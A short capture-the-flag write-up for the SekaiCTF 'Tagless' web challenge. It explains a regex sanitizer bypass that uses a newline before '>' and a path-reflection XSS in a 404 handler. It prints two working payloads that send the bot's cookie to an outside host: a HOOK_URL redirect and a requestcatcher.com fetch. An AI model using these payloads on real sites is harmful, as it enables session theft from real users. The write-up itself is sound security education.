Writeup for SekaiCTF

# Tagless

This was a bot cookie exfiltration challenge. There's two solutions to this.

Background:
So this is a very simple app where you enter a message in a textarea and the message gets displayed on the area below after sanitization.
The sanitization logic is this:

```
function sanitizeInput(str) {
    str = str.replace(/<.*>/igm, '').replace(/<\.*>/igm, '').replace(/<.*>.*<\/.*>/igm, ''); 
    return str;
}
```

This basically removes all HTML tags from the input. 

`<.*>`: Matches any string that starts with < and ends with >, including any characters in between.
`<\.*>`: Matches any string that starts with < and ends with >, including any characters in between, but with a literal . character. // I can't understand why this is needed
`<.*>.*<\/.*>`: Matches any string that starts with <, followed by any characters, then >, followed by any characters, then </, followed by any characters, and ending with >.

The bypass was to basically to use '\n>' instead of '>' because most html parsers will overlook this and consider it a valid tag.

In the code we find there is a query parameter auto_input which does the same thing as the textbox,i.e. send an input to sanitizer and then display. So this is surely for the bot.

There is also an 404 handler route which has this code:
```
@app.errorhandler(404)
def page_not_found(error):
    path = request.path
    return f"{path} not found"
```
Its directly appending the path to the return which is vulnerbale to XSS.

Exploit:

Method one:
The exploit is basically to send this payload as auto_input value to the report url.

```
js2 = urllib.parse.quote(f"t/; window.location=\"{HOOK_URL}/?c=\" + btoa(document.cookie); //")
js = f"<script src=\"http://127.0.0.1:5000/{js2}\"></script>"

# Sanitize bypass
js = urllib.parse.quote(js.strip().replace(">","\n>"))

url = f"http://127.0.0.1:5000/?auto_input={js}"
r = requests.post(f"{BASE_URL}/report", data={"url": url})

```

Method 2:

We use the error handler logic. We can check for XSS by using this POC:
`https://tagless.chals.sekai.team/%3Cscript%20src=%22/**/alert(document.domain)//%22%3E%3C/script%3E` which shows an alert box.
So our final payload is 
`http://127.0.0.1:5000/<script src="/**/fetch(`https://byc.requestcatcher.com//?cookie=${document.cookie}`)//"></script>`
